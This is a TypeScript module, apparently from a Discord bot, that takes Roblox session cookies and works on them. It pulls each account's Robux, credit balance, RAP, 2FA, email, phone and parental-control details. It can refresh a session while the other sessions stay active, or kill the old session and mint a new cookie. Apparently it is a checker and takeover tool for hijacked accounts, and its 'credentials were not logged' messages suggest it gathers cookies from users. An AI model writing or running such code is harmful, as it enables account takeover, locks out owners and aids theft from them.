import * as Roblox from './roblox-api';
import {
  buildSuccessEmbed,
  buildErrorEmbed,
  buildInvalidCookieEmbed,
  buildIpLimitEmbed,
  buildAccountEmbed,
} from './embed-helpers';

export async function runLoginAction(cookie: string) {
  const validation = await Roblox.validateCookie(cookie);
  if (!validation.valid) {
    return { success: false, embed: validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed() };
  }

  const userId = String(validation.userId!);
  const [credit, twoStep, phone, rap, ageData, ageGroup] = await Promise.all([
    Roblox.fetchCreditBalance(cookie),
    Roblox.fetchTwoStepConfig(cookie, userId),
    Roblox.fetchPhoneInfo(cookie),
    Roblox.fetchRolimonsRAP(userId),
    Roblox.getUserAge(validation.userId!),
    Roblox.fetchAgeGroup(cookie),
  ]);

  const ageString = `Created ${ageData.createdYear} (${ageData.days}D) - ${ageGroup}`;

  const robux = await Roblox.fetchRobux(cookie, userId);
  const summary = await Roblox.fetchTransactionTotals(cookie, userId);
  const country = await Roblox.fetchCountry(cookie);
  const email = await Roblox.fetchEmailInfo(cookie);
  const parental = await Roblox.fetchParentalControls(cookie);
  const thumb = await Roblox.fetchAvatarThumbnail(userId);

  let emailStatus = 'No email found';
  if (email.verified) emailStatus = `✅ Verified: \`${email.verified}\``;
  else if (email.pending) emailStatus = `⏳ Pending: \`${email.pending}\``;

  const twoStepStatus = `\`\`\`📧 Email 2FA ${twoStep.email ? '✅' : '❌'} | 🔐 Authenticator ${twoStep.authenticator ? '✅' : '❌'}\`\`\``;
  const phoneStatus = `\`\`\`${phone.hasPhone ? (phone.verified ? '✅ Verified' : '📱 Unverified') : '❌ No Phone'}\`\`\``;
  const balance = `\`\`\`${credit.balance} ${credit.currency}\`\`\``;
  const rapValue = `\`\`\`${rap.rap !== null ? rap.rap.toLocaleString() : 'PRIVATE'}\`\`\``;
  const premiumValue = `\`\`\`${rap.premium ? '✅ Yes' : '❌ No'}\`\`\``;

  const embed = buildAccountEmbed(
    validation.username!,
    validation.displayName || null,
    validation.userId!,
    ageString,
    robux,
    summary,
    country,
    emailStatus,
    parental.hasParent ? '✅ Parent linked' : '❌ No parent linked',
    thumb
  );

  embed.addFields(
    { name: '💳 Balance', value: balance, inline: true },
    { name: '📞 Phone', value: phoneStatus, inline: true },
    { name: '🔐 2FA', value: twoStepStatus, inline: false },
    { name: '📈 RAP', value: rapValue, inline: true },
    { name: '⭐ Premium', value: premiumValue, inline: true }
  );

  return { success: true, embed };
}

export async function runRefreshAction(cookie: string) {
  const validation = await Roblox.validateCookie(cookie);
  if (!validation.valid) {
    return { success: false, embed: validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed() };
  }
  const result = await Roblox.refreshSession(cookie);
  if (result.success && result.newCookie) {
    const embed = buildSuccessEmbed(
      '✧ **Refresh Successful**\n' +
      `────\n` +
      `⭑ New Session Created.\n` +
      `⭑ Other Sessions Still Active.\n` +
      `⭑ Your credentials were not logged.`
    );
    return { success: true, embed, newCookie: result.newCookie };
  }
  return { success: false, embed: buildErrorEmbed('✧ **Refresh Failed**\n────\n⭑ Could not refresh the session. Please try again later.') };
}

export async function runResetAction(cookie: string) {
  const validation = await Roblox.validateCookie(cookie);
  if (!validation.valid) {
    return { success: false, embed: validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed() };
  }
  const result = await Roblox.killAndRefreshSession(cookie);
  if (result.success && result.newCookie) {
    const embed = buildSuccessEmbed(
      '✧ **Old Cookie Terminated!**\n' +
      `────\n` +
      `⭑ New Session Created!\n` +
      `⭑ Old session destroyed.\n` +
      `⭑ Your credentials were not logged.`
    );
    return { success: true, embed, newCookie: result.newCookie };
  }
  return { success: false, embed: buildErrorEmbed('✧ **Reset Failed**\n────\n⭑ Could not refresh the session. Please try again later.') };
}

export async function runClearAction(cookie: string) {
  const cleaned = Roblox.extractCookie(cookie);
  if (!cleaned) {
    return { success: false, embed: buildErrorEmbed('✧ **No Cookie Found**\n────\n⭑ No valid cookie token found.') };
  }
  const embed = buildSuccessEmbed(
    '✧ **Cleaned Cookie**\n' +
    `────\n` +
    `\`\`\`\n${cleaned}\n\`\`\`\n` +
    `────\n` +
    `⭑ Removed Comments..`
  );
  return { success: true, embed, cleanedCookie: cleaned };
}